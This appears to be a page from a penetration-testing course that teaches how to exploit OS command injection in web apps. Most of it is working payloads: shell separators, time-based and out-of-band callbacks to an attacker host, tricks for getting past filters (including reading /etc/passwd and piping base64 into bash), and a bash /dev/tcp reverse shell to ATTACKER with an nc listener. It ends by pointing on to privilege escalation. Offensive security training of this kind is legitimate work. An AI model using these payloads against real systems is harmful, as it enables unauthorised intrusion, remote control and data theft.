---
title: Exploit command injection
slug: command-injection
area: web
module: 22
order: 6
goal: Run operating-system commands through a web app that passes your input to a shell.
summary: How to find and exploit OS command injection — inject with shell metacharacters, use blind/time-based detection, bypass filters, and land a reverse shell.
prereqs: [An input that looks like it runs a system command (ping, nslookup, convert, export…), A listener for the reverse shell, A proxy to craft payloads]
seeAlso: [tool:web-attacks, tool:web-proxies, tool:reverse-shells, howto:file-inclusion, howto:sqli-to-shell]
references:
  - PayloadsAllTheThings: command injection | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
  - HackTricks: command injection | https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
---

When an app builds a shell command from your input, injecting a metacharacter runs your command alongside theirs. Features that "ping a host" or "convert a file" are the classic candidates.

## Inject

Chain your command onto theirs with a separator:

```text
; id
| id
|| id
& id
`id`
$(id)
%0a id        (newline)
```

So `127.0.0.1; id` or `127.0.0.1 | whoami` in a "ping" field.

## Blind / time-based detection

No output shown? Prove execution by timing or an out-of-band callback.

```text
127.0.0.1 & ping -c 5 ATTACKER        # watch tcpdump / your listener
127.0.0.1 ; sleep 5                    # response delayed = it ran
```

## Bypass filters

```text
Spaces blocked:   {cat,/etc/passwd}   or   cat${IFS}/etc/passwd
Keyword blocked:  c""at /etc/pa''ss''wd   or   /bin/c?t /etc/passwd
Encode:           base64 -d <<< <b64> | bash
```

## Reverse shell

```bash
nc -lvnp 9001
# inject:  ; bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'
```

## If it fails

- **No output and no delay**: likely blind — use `sleep`/`ping` timing or an OOB DNS/HTTP callback to confirm.
- **Separator stripped**: try the others (`%0a`, `$(...)`, backticks); the app may only block `;`.
- **Spaces/keywords filtered**: use `${IFS}`, brace expansion, quotes inside words, or wildcards (`/etc/pa*wd`).
- **Shell is restricted**: you may be in a limited shell — break out, then upgrade the TTY.

## Verify

Command output in the response, a timed delay, or a callback to your listener confirms execution. Catch a reverse shell, stabilise the TTY, and move to privesc.
